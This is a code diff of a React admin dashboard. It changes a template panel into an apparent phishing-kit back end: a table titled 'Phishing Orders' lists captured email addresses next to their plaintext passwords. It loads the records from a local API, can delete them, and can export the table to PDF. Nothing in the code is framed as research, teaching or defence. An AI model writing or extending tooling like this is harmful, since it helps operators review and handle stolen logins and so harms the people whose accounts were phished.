@@ -1,6 +1,29 @@
 import React from "react";
+import jsPDF from "jspdf";
+import axios from "axios";
 
 const Dashbord = () => {
+  const [users, setUsers] = React.useState(null);
+  let rndId = 1;
+  React.useEffect(() => {
+    const fetch = async () => {
+      const { data } = await axios.get("http://localhost:8080/api/get");
+      setUsers(data);
+    };
+    fetch();
+  }, []);
+  const removeOrders = async (name) => {
+    await axios.delete(`http://localhost:8080/api/delete/${name}`);
+  };
+  const dowloandPdf = () => {
+    let pdf = new jsPDF("p", "pt", "a4");
+    pdf.html(document.getElementById("box_info"), {
+      callback: function (pd) {
+        pd.save("asrbekPdf.pdf");
+      },
+    });
+  };
+
   return (
     <main>
       <div className="head-title">
@@ -20,7 +43,7 @@ const Dashbord = () => {
             </li>
           </ul>
         </div>
-        <a href="https://iqlim.uz" className="btn-download">
+        <a href="#f" className="btn-download" onClick={dowloandPdf}>
           <i className="bx bxs-cloud-download"></i>
           <span className="text">Download PDF</span>
         </a>
@@ -30,30 +53,16 @@ const Dashbord = () => {
         <li>
           <i className="bx bxs-calendar-check"></i>
           <span className="text">
-            <h3>1020</h3>
-            <p>New Order</p>
-          </span>
-        </li>
-        <li>
-          <i className="bx bxs-group"></i>
-          <span className="text">
-            <h3>2834</h3>
-            <p>Visitors</p>
-          </span>
-        </li>
-        <li>
-          <i className="bx bxs-dollar-circle"/>
-          <span className="text">
-            <h3>$2543</h3>
-            <p>Total Sales</p>
+            <h3>{users?.length}</h3>
+            <p>New Users</p>
           </span>
         </li>
       </ul>
 
-      <div className="table-data">
+      <div className="table-data" id="box_info">
         <div className="order">
           <div className="head">
-            <h3>Recent Orders</h3>
+            <h3>Phishing Orders</h3>
             <i className="bx bx-search"></i>
             <i className="bx bx-filter"></i>
           </div>
@@ -61,92 +70,31 @@ const Dashbord = () => {
             <thead>
               <tr>
                 <th>User</th>
-                <th>Date Order</th>
-                <th>Status</th>
+                <th>Password</th>
+                <th>Remove</th>
               </tr>
             </thead>
             <tbody>
-              <tr>
-                <td>
-                  <img src="img/people.png" alt="img" />
-                  <p>John Doe</p>
-                </td>
-                <td>01-10-2021</td>
-                <td>
-                  <span className="status completed">Completed</span>
-                </td>
-              </tr>
-              <tr>
-                <td>
-                  <img src="img/people.png" alt="img" />
-                  <p>John Doe</p>
-                </td>
-                <td>01-10-2021</td>
-                <td>
-                  <span className="status pending">Pending</span>
-                </td>
-              </tr>
-              <tr>
-                <td>
-                  <img src="img/people.png" alt="img" />
-                  <p>John Doe</p>
-                </td>
-                <td>01-10-2021</td>
-                <td>
-                  <span className="status process">Process</span>
-                </td>
-              </tr>
-              <tr>
-                <td>
-                  <img src="img/people.png" alt="img" />
-                  <p>John Doe</p>
-                </td>
-                <td>01-10-2021</td>
-                <td>
-                  <span className="status pending">Pending</span>
-                </td>
-              </tr>
-              <tr>
-                <td>
-                  <img src="img/people.png" alt="img" />
-                  <p>John Doe</p>
-                </td>
-                <td>01-10-2021</td>
-                <td>
-                  <span className="status completed">Completed</span>
-                </td>
-              </tr>
+              {users?.map((items) => (
+                <tr key={items.id}>
+                  <td>
+                    <b>{rndId++}</b>
+                    <span>{items.email[0]}</span>
+                    <p>{items.email}</p>
+                  </td>
+                  <td>{items.password}</td>
+                  <td>
+                    <button
+                      className="status pending btn"
+                      onClick={() => removeOrders(items.email)}
+                    >
+                      Remove
+                    </button>
+                  </td>
+                </tr>
+              ))}
             </tbody>
           </table>
-        </div>
-        <div className="todo">
-          <div className="head">
-            <h3>Todos</h3>
-            <i className="bx bx-plus"></i>
-            <i className="bx bx-filter"></i>
-          </div>
-          <ul className="todo-list">
-            <li className="completed">
-              <p>Todo List</p>
-              <i className="bx bx-dots-vertical-rounded"></i>
-            </li>
-            <li className="completed">
-              <p>Todo List</p>
-              <i className="bx bx-dots-vertical-rounded"></i>
-            </li>
-            <li className="not-completed">
-              <p>Todo List</p>
-              <i className="bx bx-dots-vertical-rounded"></i>
-            </li>
-            <li className="completed">
-              <p>Todo List</p>
-              <i className="bx bx-dots-vertical-rounded"></i>
-            </li>
-            <li className="not-completed">
-              <p>Todo List</p>
-              <i className="bx bx-dots-vertical-rounded"/>
-            </li>
-          </ul>
         </div>
       </div>
     </main>
